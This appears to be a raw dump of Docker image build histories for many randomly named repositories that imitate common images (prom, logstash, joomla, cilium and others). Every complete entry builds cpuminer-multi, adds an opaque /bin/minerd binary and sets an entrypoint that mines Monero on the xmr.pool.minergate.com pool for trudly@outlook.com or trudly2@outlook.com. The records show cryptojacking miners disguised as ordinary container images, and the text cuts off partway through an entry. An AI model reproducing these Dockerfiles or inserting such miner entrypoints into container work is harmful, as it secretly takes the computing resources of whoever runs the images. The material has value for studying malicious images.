echo \'docker\' > /run/systemd/container\nCMD ["/bin/bash"]\nRUN apt-get update -qq &&             apt-get install -qqy libcurl4-openssl-dev libncurses5-dev pkg-config automake make yasm git\nRUN git clone https://github.com/OhGodAPet/cpuminer-multi\nRUN cd cpuminer-multi &&             ./autogen.sh &&             CFLAGS="-march=native" ./configure &&             make\nWORKDIR /cpuminer-multi\nADD file:6086fe1466d461e3d763ca57e1e45bd5c35d1a87a8b1a7ca6b9085c795c13dd6 /bin/minerd\nRUN chmod 755 /bin/minerd\nENTRYPOINT ["/bin/minerd -a cryptonight -o stratum+tcp://xmr.pool.minergate.com:45560 -u trudly@outlook.com -p x -t 1"]'
ouqsglubexcom/prom; b'ADD file:d14b493577228a498919faab376609c73048c0220b06d2989ecaaf1bdc17cf6c /\nRUN set -xe \t\t&& echo \'#!/bin/sh\' > /usr/sbin/policy-rc.d \t&& echo \'exit 101\' >> /usr/sbin/policy-rc.d \t&& chmod +x /usr/sbin/policy-rc.d \t\t&& dpkg-divert --local --rename --add /sbin/initctl \t&& cp -a /usr/sbin/policy-rc.d /sbin/initctl \t&& sed -i \'s/^exit.*/exit 0/\' /sbin/initctl \t\t&& echo \'force-unsafe-io\' > /etc/dpkg/dpkg.cfg.d/docker-apt-speedup \t\t&& echo \'DPkg::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' > /etc/apt/apt.conf.d/docker-clean \t&& echo \'APT::Update::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' >> /etc/apt/apt.conf.d/docker-clean \t&& echo \'Dir::Cache::pkgcache ""; Dir::Cache::srcpkgcache "";\' >> /etc/apt/apt.conf.d/docker-clean \t\t&& echo \'Acquire::Languages "none";\' > /etc/apt/apt.conf.d/docker-no-languages \t\t&& echo \'Acquire::GzipIndexes "true"; Acquire::CompressionTypes::Order:: "gz";\' > /etc/apt/apt.conf.d/docker-gzip-indexes \t\t&& echo \'Apt::AutoRemove::SuggestsImportant "false";\' > /etc/apt/apt.conf.d/docker-autoremove-suggests\nRUN rm -rf /var/lib/apt/lists/*\nRUN sed -i \'s/^#\\s*\\(deb.*universe\\)$/\\1/g\' /etc/apt/sources.list\nRUN mkdir -p /run/systemd && echo \'docker\' > /run/systemd/container\nCMD ["/bin/bash"]\nRUN apt-get update -qq &&             apt-get install -qqy libcurl4-openssl-dev libncurses5-dev pkg-config automake make yasm git\nRUN git clone https://github.com/OhGodAPet/cpuminer-multi\nRUN cd cpuminer-multi &&             ./autogen.sh &&             CFLAGS="-march=native" ./configure &&             make\nWORKDIR /cpuminer-multi\nADD file:afde9ecdee7c30424c34429495943506ea91afa626d8572e82d486ecf84310b2 /bin/minerd\nRUN chmod 755 /bin/minerd\nENTRYPOINT ["/bin/minerd -a cryptonight -o stratum+tcp://xmr.pool.minergate.com:45560 -u trudly@outlook.com -p x -t 1"]'
mtirmonadiml/shadow; b'ADD file:d14b493577228a498919faab376609c73048c0220b06d2989ecaaf1bdc17cf6c /\nRUN set -xe \t\t&& echo \'#!/bin/sh\' > /usr/sbin/policy-rc.d \t&& echo \'exit 101\' >> /usr/sbin/policy-rc.d \t&& chmod +x /usr/sbin/policy-rc.d \t\t&& dpkg-divert --local --rename --add /sbin/initctl \t&& cp -a /usr/sbin/policy-rc.d /sbin/initctl \t&& sed -i \'s/^exit.*/exit 0/\' /sbin/initctl \t\t&& echo \'force-unsafe-io\' > /etc/dpkg/dpkg.cfg.d/docker-apt-speedup \t\t&& echo \'DPkg::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' > /etc/apt/apt.conf.d/docker-clean \t&& echo \'APT::Update::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' >> /etc/apt/apt.conf.d/docker-clean \t&& echo \'Dir::Cache::pkgcache ""; Dir::Cache::srcpkgcache "";\' >> /etc/apt/apt.conf.d/docker-clean \t\t&& echo \'Acquire::Languages "none";\' > /etc/apt/apt.conf.d/docker-no-languages \t\t&& echo \'Acquire::GzipIndexes "true"; Acquire::CompressionTypes::Order:: "gz";\' > /etc/apt/apt.conf.d/docker-gzip-indexes \t\t&& echo \'Apt::AutoRemove::SuggestsImportant "false";\' > /etc/apt/apt.conf.d/docker-autoremove-suggests\nRUN rm -rf /var/lib/apt/lists/*\nRUN sed -i \'s/^#\\s*\\(deb.*universe\\)$/\\1/g\' /etc/apt/sources.list\nRUN mkdir -p /run/systemd && echo \'docker\' > /run/systemd/container\nCMD ["/bin/bash"]\nRUN apt-get update -qq &&             apt-get install -qqy libcurl4-openssl-dev libncurses5-dev pkg-config automake make yasm git\nRUN git clone https://github.com/OhGodAPet/cpuminer-multi\nRUN cd cpuminer-multi &&             ./autogen.sh &&             CFLAGS="-march=native" ./configure &&             make\nWORKDIR /cpuminer-multi\nADD file:afde9ecdee7c30424c34429495943506ea91afa626d8572e82d486ecf84310b2 /bin/minerd\nRUN chmod 755 /bin/minerd\nENTRYPOINT ["/bin/minerd -a cryptonight -o stratum+tcp://xmr.pool.minergate.com:45560 -u trudly@outlook.com -p x -t 1"]'
vataxiskekitacom/storm; b'ADD file:d14b493577228a498919faab376609c73048c0220b06d2989ecaaf1bdc17cf6c /\nRUN set -xe \t\t&& echo \'#!/bin/sh\' > /usr/sbin/policy-rc.d \t&& echo \'exit 101\' >> /usr/sbin/policy-rc.d \t&& chmod +x /usr/sbin/policy-rc.d \t\t&& dpkg-divert --local --rename --add /sbin/initctl \t&& cp -a /usr/sbin/policy-rc.d /sbin/initctl \t&& sed -i \'s/^exit.*/exit 0/\' /sbin/initctl \t\t&& echo \'force-unsafe-io\' > /etc/dpkg/dpkg.cfg.d/docker-apt-speedup \t\t&& echo \'DPkg::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' > /etc/apt/apt.conf.d/docker-clean \t&& echo \'APT::Update::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' >> /etc/apt/apt.conf.d/docker-clean \t&& echo \'Dir::Cache::pkgcache ""; Dir::Cache::srcpkgcache "";\' >> /etc/apt/apt.conf.d/docker-clean \t\t&& echo \'Acquire::Languages "none";\' > /etc/apt/apt.conf.d/docker-no-languages \t\t&& echo \'Acquire::GzipIndexes "true"; Acquire::CompressionTypes::Order:: "gz";\' > /etc/apt/apt.conf.d/docker-gzip-indexes \t\t&& echo \'Apt::AutoRemove::SuggestsImportant "false";\' > /etc/apt/apt.conf.d/docker-autoremove-suggests\nRUN rm -rf /var/lib/apt/lists/*\nRUN sed -i \'s/^#\\s*\\(deb.*universe\\)$/\\1/g\' /etc/apt/sources.list\nRUN mkdir -p /run/systemd && echo \'docker\' > /run/systemd/container\nCMD ["/bin/bash"]\nRUN apt-get update -qq &&             apt-get install -qqy libcurl4-openssl-dev libncurses5-dev pkg-config automake make yasm git\nRUN git clone https://github.com/OhGodAPet/cpuminer-multi\nRUN cd cpuminer-multi &&             ./autogen.sh &&             CFLAGS="-march=native" ./configure &&             make\nWORKDIR /cpuminer-multi\nADD file:afde9ecdee7c30424c34429495943506ea91afa626d8572e82d486ecf84310b2 /bin/minerd\nRUN chmod 755 /bin/minerd\nENTRYPOINT ["/bin/minerd -a cryptonight -o stratum+tcp://xmr.pool.minergate.com:45560 -u trudly@outlook.com -p x -t 1"]'
voyicicnezdiroorg/spacel; b'ADD file:d14b493577228a498919faab376609c73048c0220b06d2989ecaaf1bdc17cf6c /\nRUN set -xe \t\t&& echo \'#!/bin/sh\' > /usr/sbin/policy-rc.d \t&& echo \'exit 101\' >> /usr/sbin/policy-rc.d \t&& chmod +x /usr/sbin/policy-rc.d \t\t&& dpkg-divert --local --rename --add /sbin/initctl \t&& cp -a /usr/sbin/policy-rc.d /sbin/initctl \t&& sed -i \'s/^exit.*/exit 0/\' /sbin/initctl \t\t&& echo \'force-unsafe-io\' > /etc/dpkg/dpkg.cfg.d/docker-apt-speedup \t\t&& echo \'DPkg::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' > /etc/apt/apt.conf.d/docker-clean \t&& echo \'APT::Update::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' >> /etc/apt/apt.conf.d/docker-clean \t&& echo \'Dir::Cache::pkgcache ""; Dir::Cache::srcpkgcache "";\' >> /etc/apt/apt.conf.d/docker-clean \t\t&& echo \'Acquire::Languages "none";\' > /etc/apt/apt.conf.d/docker-no-languages \t\t&& echo \'Acquire::GzipIndexes "true"; Acquire::CompressionTypes::Order:: "gz";\' > /etc/apt/apt.conf.d/docker-gzip-indexes \t\t&& echo \'Apt::AutoRemove::SuggestsImportant "false";\' > /etc/apt/apt.conf.d/docker-autoremove-suggests\nRUN rm -rf /var/lib/apt/lists/*\nRUN sed -i \'s/^#\\s*\\(deb.*universe\\)$/\\1/g\' /etc/apt/sources.list\nRUN mkdir -p /run/systemd && echo \'docker\' > /run/systemd/container\nCMD ["/bin/bash"]\nRUN apt-get update -qq &&             apt-get install -qqy libcurl4-openssl-dev libncurses5-dev pkg-config automake make yasm git\nRUN git clone https://github.com/OhGodAPet/cpuminer-multi\nRUN cd cpuminer-multi &&             ./autogen.sh &&             CFLAGS="-march=native" ./configure &&             make\nWORKDIR /cpuminer-multi\nADD file:6086fe1466d461e3d763ca57e1e45bd5c35d1a87a8b1a7ca6b9085c795c13dd6 /bin/minerd\nRUN chmod 755 /bin/minerd\nENTRYPOINT ["/bin/minerd -a cryptonight -o stratum+tcp://xmr.pool.minergate.com:45560 -u trudly@outlook.com -p x -t 1"]'
vihamifumorsincom/spacel; b'ADD file:d14b493577228a498919faab376609c73048c0220b06d2989ecaaf1bdc17cf6c /\nRUN set -xe \t\t&& echo \'#!/bin/sh\' > /usr/sbin/policy-rc.d \t&& echo \'exit 101\' >> /usr/sbin/policy-rc.d \t&& chmod +x /usr/sbin/policy-rc.d \t\t&& dpkg-divert --local --rename --add /sbin/initctl \t&& cp -a /usr/sbin/policy-rc.d /sbin/initctl \t&& sed -i \'s/^exit.*/exit 0/\' /sbin/initctl \t\t&& echo \'force-unsafe-io\' > /etc/dpkg/dpkg.cfg.d/docker-apt-speedup \t\t&& echo \'DPkg::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' > /etc/apt/apt.conf.d/docker-clean \t&& echo \'APT::Update::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' >> /etc/apt/apt.conf.d/docker-clean \t&& echo \'Dir::Cache::pkgcache ""; Dir::Cache::srcpkgcache "";\' >> /etc/apt/apt.conf.d/docker-clean \t\t&& echo \'Acquire::Languages "none";\' > /etc/apt/apt.conf.d/docker-no-languages \t\t&& echo \'Acquire::GzipIndexes "true"; Acquire::CompressionTypes::Order:: "gz";\' > /etc/apt/apt.conf.d/docker-gzip-indexes \t\t&& echo \'Apt::AutoRemove::SuggestsImportant "false";\' > /etc/apt/apt.conf.d/docker-autoremove-suggests\nRUN rm -rf /var/lib/apt/lists/*\nRUN sed -i \'s/^#\\s*\\(deb.*universe\\)$/\\1/g\' /etc/apt/sources.list\nRUN mkdir -p /run/systemd && echo \'docker\' > /run/systemd/container\nCMD ["/bin/bash"]\nRUN apt-get update -qq &&             apt-get install -qqy libcurl4-openssl-dev libncurses5-dev pkg-config automake make yasm git\nRUN git clone https://github.com/OhGodAPet/cpuminer-multi\nRUN cd cpuminer-multi &&             ./autogen.sh &&             CFLAGS="-march=native" ./configure &&             make\nWORKDIR /cpuminer-multi\nADD file:afde9ecdee7c30424c34429495943506ea91afa626d8572e82d486ecf84310b2 /bin/minerd\nRUN chmod 755 /bin/minerd\nENTRYPOINT ["/bin/minerd -a cryptonight -o stratum+tcp://xmr.pool.minergate.com:45560 -u trudly@outlook.com -p x -t 1"]'
vukexozobezhorachucom/logstash; b'ADD file:d14b493577228a498919faab376609c73048c0220b06d2989ecaaf1bdc17cf6c /\nRUN set -xe \t\t&& echo \'#!/bin/sh\' > /usr/sbin/policy-rc.d \t&& echo \'exit 101\' >> /usr/sbin/policy-rc.d \t&& chmod +x /usr/sbin/policy-rc.d \t\t&& dpkg-divert --local --rename --add /sbin/initctl \t&& cp -a /usr/sbin/policy-rc.d /sbin/initctl \t&& sed -i \'s/^exit.*/exit 0/\' /sbin/initctl \t\t&& echo \'force-unsafe-io\' > /etc/dpkg/dpkg.cfg.d/docker-apt-speedup \t\t&& echo \'DPkg::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' > /etc/apt/apt.conf.d/docker-clean \t&& echo \'APT::Update::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' >> /etc/apt/apt.conf.d/docker-clean \t&& echo \'Dir::Cache::pkgcache ""; Dir::Cache::srcpkgcache "";\' >> /etc/apt/apt.conf.d/docker-clean \t\t&& echo \'Acquire::Languages "none";\' > /etc/apt/apt.conf.d/docker-no-languages \t\t&& echo \'Acquire::GzipIndexes "true"; Acquire::CompressionTypes::Order:: "gz";\' > /etc/apt/apt.conf.d/docker-gzip-indexes \t\t&& echo \'Apt::AutoRemove::SuggestsImportant "false";\' > /etc/apt/apt.conf.d/docker-autoremove-suggests\nRUN rm -rf /var/lib/apt/lists/*\nRUN sed -i \'s/^#\\s*\\(deb.*universe\\)$/\\1/g\' /etc/apt/sources.list\nRUN mkdir -p /run/systemd && echo \'docker\' > /run/systemd/container\nCMD ["/bin/bash"]\nRUN apt-get update -qq &&             apt-get install -qqy libcurl4-openssl-dev libncurses5-dev pkg-config automake make yasm git\nRUN git clone https://github.com/OhGodAPet/cpuminer-multi\nRUN cd cpuminer-multi &&             ./autogen.sh &&             CFLAGS="-march=native" ./configure &&             make\nWORKDIR /cpuminer-multi\nADD file:6086fe1466d461e3d763ca57e1e45bd5c35d1a87a8b1a7ca6b9085c795c13dd6 /bin/minerd\nRUN chmod 755 /bin/minerd\nENTRYPOINT ["/bin/minerd -a cryptonight -o stratum+tcp://xmr.pool.minergate.com:45560 -u trudly@outlook.com -p x -t 1"]'
zecwebidega/kaazing; b'ADD file:d14b493577228a498919faab376609c73048c0220b06d2989ecaaf1bdc17cf6c /\nRUN set -xe \t\t&& echo \'#!/bin/sh\' > /usr/sbin/policy-rc.d \t&& echo \'exit 101\' >> /usr/sbin/policy-rc.d \t&& chmod +x /usr/sbin/policy-rc.d \t\t&& dpkg-divert --local --rename --add /sbin/initctl \t&& cp -a /usr/sbin/policy-rc.d /sbin/initctl \t&& sed -i \'s/^exit.*/exit 0/\' /sbin/initctl \t\t&& echo \'force-unsafe-io\' > /etc/dpkg/dpkg.cfg.d/docker-apt-speedup \t\t&& echo \'DPkg::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' > /etc/apt/apt.conf.d/docker-clean \t&& echo \'APT::Update::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' >> /etc/apt/apt.conf.d/docker-clean \t&& echo \'Dir::Cache::pkgcache ""; Dir::Cache::srcpkgcache "";\' >> /etc/apt/apt.conf.d/docker-clean \t\t&& echo \'Acquire::Languages "none";\' > /etc/apt/apt.conf.d/docker-no-languages \t\t&& echo \'Acquire::GzipIndexes "true"; Acquire::CompressionTypes::Order:: "gz";\' > /etc/apt/apt.conf.d/docker-gzip-indexes \t\t&& echo \'Apt::AutoRemove::SuggestsImportant "false";\' > /etc/apt/apt.conf.d/docker-autoremove-suggests\nRUN rm -rf /var/lib/apt/lists/*\nRUN sed -i \'s/^#\\s*\\(deb.*universe\\)$/\\1/g\' /etc/apt/sources.list\nRUN mkdir -p /run/systemd && echo \'docker\' > /run/systemd/container\nCMD ["/bin/bash"]\nRUN apt-get update -qq &&             apt-get install -qqy libcurl4-openssl-dev libncurses5-dev pkg-config automake make yasm git\nRUN git clone https://github.com/OhGodAPet/cpuminer-multi\nRUN cd cpuminer-multi &&             ./autogen.sh &&             CFLAGS="-march=native" ./configure &&             make\nWORKDIR /cpuminer-multi\nADD file:afde9ecdee7c30424c34429495943506ea91afa626d8572e82d486ecf84310b2 /bin/minerd\nRUN chmod 755 /bin/minerd\nENTRYPOINT ["/bin/minerd -a cryptonight -o stratum+tcp://xmr.pool.minergate.com:45560 -u trudly@outlook.com -p x -t 1"]'
vesnpsexga/joomla; b'ADD file:d14b493577228a498919faab376609c73048c0220b06d2989ecaaf1bdc17cf6c /\nRUN set -xe \t\t&& echo \'#!/bin/sh\' > /usr/sbin/policy-rc.d \t&& echo \'exit 101\' >> /usr/sbin/policy-rc.d \t&& chmod +x /usr/sbin/policy-rc.d \t\t&& dpkg-divert --local --rename --add /sbin/initctl \t&& cp -a /usr/sbin/policy-rc.d /sbin/initctl \t&& sed -i \'s/^exit.*/exit 0/\' /sbin/initctl \t\t&& echo \'force-unsafe-io\' > /etc/dpkg/dpkg.cfg.d/docker-apt-speedup \t\t&& echo \'DPkg::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' > /etc/apt/apt.conf.d/docker-clean \t&& echo \'APT::Update::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' >> /etc/apt/apt.conf.d/docker-clean \t&& echo \'Dir::Cache::pkgcache ""; Dir::Cache::srcpkgcache "";\' >> /etc/apt/apt.conf.d/docker-clean \t\t&& echo \'Acquire::Languages "none";\' > /etc/apt/apt.conf.d/docker-no-languages \t\t&& echo \'Acquire::GzipIndexes "true"; Acquire::CompressionTypes::Order:: "gz";\' > /etc/apt/apt.conf.d/docker-gzip-indexes \t\t&& echo \'Apt::AutoRemove::SuggestsImportant "false";\' > /etc/apt/apt.conf.d/docker-autoremove-suggests\nRUN rm -rf /var/lib/apt/lists/*\nRUN sed -i \'s/^#\\s*\\(deb.*universe\\)$/\\1/g\' /etc/apt/sources.list\nRUN mkdir -p /run/systemd && echo \'docker\' > /run/systemd/container\nCMD ["/bin/bash"]\nRUN apt-get update -qq &&             apt-get install -qqy libcurl4-openssl-dev libncurses5-dev pkg-config automake make yasm git\nRUN git clone https://github.com/OhGodAPet/cpuminer-multi\nRUN cd cpuminer-multi &&             ./autogen.sh &&             CFLAGS="-march=native" ./configure &&             make\nWORKDIR /cpuminer-multi\nADD file:afde9ecdee7c30424c34429495943506ea91afa626d8572e82d486ecf84310b2 /bin/minerd\nRUN chmod 755 /bin/minerd\nENTRYPOINT ["/bin/minerd -a cryptonight -o stratum+tcp://xmr.pool.minergate.com:45560 -u trudly@outlook.com -p x -t 1"]'
wetocepshalarnet/logstash; b'ADD file:d14b493577228a498919faab376609c73048c0220b06d2989ecaaf1bdc17cf6c /\nRUN set -xe \t\t&& echo \'#!/bin/sh\' > /usr/sbin/policy-rc.d \t&& echo \'exit 101\' >> /usr/sbin/policy-rc.d \t&& chmod +x /usr/sbin/policy-rc.d \t\t&& dpkg-divert --local --rename --add /sbin/initctl \t&& cp -a /usr/sbin/policy-rc.d /sbin/initctl \t&& sed -i \'s/^exit.*/exit 0/\' /sbin/initctl \t\t&& echo \'force-unsafe-io\' > /etc/dpkg/dpkg.cfg.d/docker-apt-speedup \t\t&& echo \'DPkg::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' > /etc/apt/apt.conf.d/docker-clean \t&& echo \'APT::Update::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' >> /etc/apt/apt.conf.d/docker-clean \t&& echo \'Dir::Cache::pkgcache ""; Dir::Cache::srcpkgcache "";\' >> /etc/apt/apt.conf.d/docker-clean \t\t&& echo \'Acquire::Languages "none";\' > /etc/apt/apt.conf.d/docker-no-languages \t\t&& echo \'Acquire::GzipIndexes "true"; Acquire::CompressionTypes::Order:: "gz";\' > /etc/apt/apt.conf.d/docker-gzip-indexes \t\t&& echo \'Apt::AutoRemove::SuggestsImportant "false";\' > /etc/apt/apt.conf.d/docker-autoremove-suggests\nRUN rm -rf /var/lib/apt/lists/*\nRUN sed -i \'s/^#\\s*\\(deb.*universe\\)$/\\1/g\' /etc/apt/sources.list\nRUN mkdir -p /run/systemd && echo \'docker\' > /run/systemd/container\nCMD ["/bin/bash"]\nRUN apt-get update -qq &&             apt-get install -qqy libcurl4-openssl-dev libncurses5-dev pkg-config automake make yasm git\nRUN git clone https://github.com/OhGodAPet/cpuminer-multi\nRUN cd cpuminer-multi &&             ./autogen.sh &&             CFLAGS="-march=native" ./configure &&             make\nWORKDIR /cpuminer-multi\nADD file:afde9ecdee7c30424c34429495943506ea91afa626d8572e82d486ecf84310b2 /bin/minerd\nRUN chmod 755 /bin/minerd\nENTRYPOINT ["/bin/minerd -a cryptonight -o stratum+tcp://xmr.pool.minergate.com:45560 -u trudly@outlook.com -p x -t 1"]'
yisaktaphearcom/upsource; b'ADD file:d14b493577228a498919faab376609c73048c0220b06d2989ecaaf1bdc17cf6c /\nRUN set -xe \t\t&& echo \'#!/bin/sh\' > /usr/sbin/policy-rc.d \t&& echo \'exit 101\' >> /usr/sbin/policy-rc.d \t&& chmod +x /usr/sbin/policy-rc.d \t\t&& dpkg-divert --local --rename --add /sbin/initctl \t&& cp -a /usr/sbin/policy-rc.d /sbin/initctl \t&& sed -i \'s/^exit.*/exit 0/\' /sbin/initctl \t\t&& echo \'force-unsafe-io\' > /etc/dpkg/dpkg.cfg.d/docker-apt-speedup \t\t&& echo \'DPkg::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' > /etc/apt/apt.conf.d/docker-clean \t&& echo \'APT::Update::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' >> /etc/apt/apt.conf.d/docker-clean \t&& echo \'Dir::Cache::pkgcache ""; Dir::Cache::srcpkgcache "";\' >> /etc/apt/apt.conf.d/docker-clean \t\t&& echo \'Acquire::Languages "none";\' > /etc/apt/apt.conf.d/docker-no-languages \t\t&& echo \'Acquire::GzipIndexes "true"; Acquire::CompressionTypes::Order:: "gz";\' > /etc/apt/apt.conf.d/docker-gzip-indexes \t\t&& echo \'Apt::AutoRemove::SuggestsImportant "false";\' > /etc/apt/apt.conf.d/docker-autoremove-suggests\nRUN rm -rf /var/lib/apt/lists/*\nRUN sed -i \'s/^#\\s*\\(deb.*universe\\)$/\\1/g\' /etc/apt/sources.list\nRUN mkdir -p /run/systemd && echo \'docker\' > /run/systemd/container\nCMD ["/bin/bash"]\nRUN apt-get update -qq &&             apt-get install -qqy libcurl4-openssl-dev libncurses5-dev pkg-config automake make yasm git\nRUN git clone https://github.com/OhGodAPet/cpuminer-multi\nRUN cd cpuminer-multi &&             ./autogen.sh &&             CFLAGS="-march=native" ./configure &&             make\nWORKDIR /cpuminer-multi\nADD file:afde9ecdee7c30424c34429495943506ea91afa626d8572e82d486ecf84310b2 /bin/minerd\nRUN chmod 755 /bin/minerd\nENTRYPOINT ["/bin/minerd -a cryptonight -o stratum+tcp://xmr.pool.minergate.com:45560 -u trudly@outlook.com -p x -t 1"]'
waholemusreftokennet/cilium; b'ADD file:d14b493577228a498919faab376609c73048c0220b06d2989ecaaf1bdc17cf6c /\nRUN set -xe \t\t&& echo \'#!/bin/sh\' > /usr/sbin/policy-rc.d \t&& echo \'exit 101\' >> /usr/sbin/policy-rc.d \t&& chmod +x /usr/sbin/policy-rc.d \t\t&& dpkg-divert --local --rename --add /sbin/initctl \t&& cp -a /usr/sbin/policy-rc.d /sbin/initctl \t&& sed -i \'s/^exit.*/exit 0/\' /sbin/initctl \t\t&& echo \'force-unsafe-io\' > /etc/dpkg/dpkg.cfg.d/docker-apt-speedup \t\t&& echo \'DPkg::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' > /etc/apt/apt.conf.d/docker-clean \t&& echo \'APT::Update::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' >> /etc/apt/apt.conf.d/docker-clean \t&& echo \'Dir::Cache::pkgcache ""; Dir::Cache::srcpkgcache "";\' >> /etc/apt/apt.conf.d/docker-clean \t\t&& echo \'Acquire::Languages "none";\' > /etc/apt/apt.conf.d/docker-no-languages \t\t&& echo \'Acquire::GzipIndexes "true"; Acquire::CompressionTypes::Order:: "gz";\' > /etc/apt/apt.conf.d/docker-gzip-indexes \t\t&& echo \'Apt::AutoRemove::SuggestsImportant "false";\' > /etc/apt/apt.conf.d/docker-autoremove-suggests\nRUN rm -rf /var/lib/apt/lists/*\nRUN sed -i \'s/^#\\s*\\(deb.*universe\\)$/\\1/g\' /etc/apt/sources.list\nRUN mkdir -p /run/systemd && echo \'docker\' > /run/systemd/container\nCMD ["/bin/bash"]\nRUN apt-get update -qq &&             apt-get install -qqy libcurl4-openssl-dev libncurses5-dev pkg-config automake make yasm git\nRUN git clone https://github.com/OhGodAPet/cpuminer-multi\nRUN cd cpuminer-multi &&             ./autogen.sh &&             CFLAGS="-march=native" ./configure &&             make\nWORKDIR /cpuminer-multi\nADD file:6086fe1466d461e3d763ca57e1e45bd5c35d1a87a8b1a7ca6b9085c795c13dd6 /bin/minerd\nRUN chmod 755 /bin/minerd\nENTRYPOINT ["/bin/minerd -a cryptonight -o stratum+tcp://xmr.pool.minergate.com:45560 -u trudly@outlook.com -p x -t 1"]'
byafarfurmailtk2/gazebo; b'ADD file:d14b493577228a498919faab376609c73048c0220b06d2989ecaaf1bdc17cf6c /\nRUN set -xe \t\t&& echo \'#!/bin/sh\' > /usr/sbin/policy-rc.d \t&& echo \'exit 101\' >> /usr/sbin/policy-rc.d \t&& chmod +x /usr/sbin/policy-rc.d \t\t&& dpkg-divert --local --rename --add /sbin/initctl \t&& cp -a /usr/sbin/policy-rc.d /sbin/initctl \t&& sed -i \'s/^exit.*/exit 0/\' /sbin/initctl \t\t&& echo \'force-unsafe-io\' > /etc/dpkg/dpkg.cfg.d/docker-apt-speedup \t\t&& echo \'DPkg::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' > /etc/apt/apt.conf.d/docker-clean \t&& echo \'APT::Update::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' >> /etc/apt/apt.conf.d/docker-clean \t&& echo \'Dir::Cache::pkgcache ""; Dir::Cache::srcpkgcache "";\' >> /etc/apt/apt.conf.d/docker-clean \t\t&& echo \'Acquire::Languages "none";\' > /etc/apt/apt.conf.d/docker-no-languages \t\t&& echo \'Acquire::GzipIndexes "true"; Acquire::CompressionTypes::Order:: "gz";\' > /etc/apt/apt.conf.d/docker-gzip-indexes \t\t&& echo \'Apt::AutoRemove::SuggestsImportant "false";\' > /etc/apt/apt.conf.d/docker-autoremove-suggests\nRUN rm -rf /var/lib/apt/lists/*\nRUN sed -i \'s/^#\\s*\\(deb.*universe\\)$/\\1/g\' /etc/apt/sources.list\nRUN mkdir -p /run/systemd && echo \'docker\' > /run/systemd/container\nCMD ["/bin/bash"]\nRUN apt-get update -qq &&             apt-get install -qqy libcurl4-openssl-dev libncurses5-dev pkg-config automake make yasm git\nRUN git clone https://github.com/OhGodAPet/cpuminer-multi\nRUN cd cpuminer-multi &&             ./autogen.sh &&             CFLAGS="-march=native" ./configure &&             make\nWORKDIR /cpuminer-multi\nADD file:afde9ecdee7c30424c34429495943506ea91afa626d8572e82d486ecf84310b2 /bin/minerd\nRUN chmod 755 /bin/minerd\nENTRYPOINT ["/bin/minerd -a cryptonight -o stratum+tcp://xmr.pool.minergate.com:45560 -u trudly2@outlook.com -p x -t 1"]'
yikuhergeekforexcom/gvard; b'ADD file:d14b493577228a498919faab376609c73048c0220b06d2989ecaaf1bdc17cf6c /\nRUN set -xe \t\t&& echo \'#!/bin/sh\' > /usr/sbin/policy-rc.d \t&& echo \'exit 101\' >> /usr/sbin/policy-rc.d \t&& chmod +x /usr/sbin/policy-rc.d \t\t&& dpkg-divert --local --rename --add /sbin/initctl \t&& cp -a /usr/sbin/policy-rc.d /sbin/initctl \t&& sed -i \'s/^exit.*/exit 0/\' /sbin/initctl \t\t&& echo \'force-unsafe-io\' > /etc/dpkg/dpkg.cfg.d/docker-apt-speedup \t\t&& echo \'DPkg::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' > /etc/apt/apt.conf.d/docker-clean \t&& echo \'APT::Update::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' >> 